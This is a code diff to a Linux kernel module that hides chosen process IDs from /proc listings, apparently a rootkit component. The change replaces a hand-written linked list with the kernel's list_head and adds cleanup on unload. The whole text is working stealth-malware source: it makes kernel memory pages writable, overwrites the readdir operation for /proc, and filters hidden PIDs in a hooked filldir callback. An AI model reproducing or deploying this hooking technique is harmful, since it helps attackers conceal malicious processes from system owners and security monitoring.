@@ -19,25 +19,28 @@ filldir_t original_proc_fillfir;
 
 
 struct proc_to_hide {
-    struct proc_to_hide* next;
+    struct list_head list;
     int pid;
 };
-struct proc_to_hide *processes_to_hide = 0;
+
 char pid_buffer[11];
 struct proc_dir_entry* proc;
+
+struct list_head processes_to_hide;
 
 
 int hooked_proc_filldir(void *__buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type){
     char buf[512];
-    struct proc_to_hide* cur;
-    for(cur = processes_to_hide; cur != 0; cur = cur->next){
-        sprintf(buf, "%d", cur->pid);
+    struct list_head* cur;
+    struct proc_to_hide* proc;
+    list_for_each(cur, &processes_to_hide){
+        proc = list_entry(cur, struct proc_to_hide, list);
+        sprintf(buf, "%d", proc->pid);
         if(strcmp(buf, name)==0){
             // OUR_DEBUG("Hiding pid %s \n", char_pids_to_hide[i]);
             return 0;
         }
     }
-
     return original_proc_fillfir(__buf, name, namelen, offset, ino, d_type);
 }
 
@@ -64,6 +67,7 @@ void load_processhiding(void)
     make_page_writable((long unsigned int) proc_fops);
 
     proc_fops->readdir = hooked_readdir;
+    INIT_LIST_HEAD(&processes_to_hide);
 }
 
 void hide_proc(int pid){
@@ -73,47 +77,48 @@ void hide_proc(int pid){
         return;
     }
     toHide = kmalloc(sizeof(struct proc_to_hide), GFP_KERNEL);
-    toHide->next = 0;
     toHide->pid = pid;
-
-    if(processes_to_hide == 0){
-        processes_to_hide = toHide;
-    } else {
-        toHide->next = processes_to_hide;
-        processes_to_hide = toHide;
-    }
+    list_add(&toHide->list, &processes_to_hide);
 }
 
 int is_hidden(int pid){
-    struct proc_to_hide* cur;
-    for(cur = processes_to_hide; cur != 0; cur = cur->next){
-        if(cur->pid == pid) return 1;
+    struct list_head* cur;
+    struct proc_to_hide* proc;
+    list_for_each(cur, &processes_to_hide){
+        proc = list_entry(cur, struct proc_to_hide, list);
+        if(proc->pid == pid){
+            return 1;
+        }
     }
     return 0;
 }
 
 void unhide_proc(int pid){
-    struct proc_to_hide* last = 0;
-    struct proc_to_hide* cur;
-    for(cur = processes_to_hide; cur != 0; cur = cur->next){
-        if(cur->pid == pid){
-            if(last == 0){
-                processes_to_hide = cur->next;
-            } else {
-                last->next = cur->next;
-            }
-            kfree(cur);
+    struct proc_to_hide* proc;
+    struct list_head *cur, *cur2;
+    list_for_each_safe(cur, cur2, &processes_to_hide){
+        proc = list_entry(cur, struct proc_to_hide, list);
+        if(proc->pid == pid){
+            list_del(cur);
+            kfree(proc);
             break;
         }
-        last = cur;
     }
 }
 
 void unload_processhiding(void)
 {
     struct file_operations *proc_fops = (struct file_operations *)proc->proc_fops;
+    struct list_head *pos, *pos2;
+    struct proc_to_hide* proc;
     make_page_writable((long unsigned int) proc_fops);
 
     proc_fops->readdir = proc_original_readdir;
     make_page_readonly((long unsigned int) proc_fops);
+
+    list_for_each_safe(pos, pos2, &processes_to_hide){
+        proc = list_entry(pos, struct proc_to_hide, list);
+        list_del(pos);
+        kfree(proc);
+    }
 }
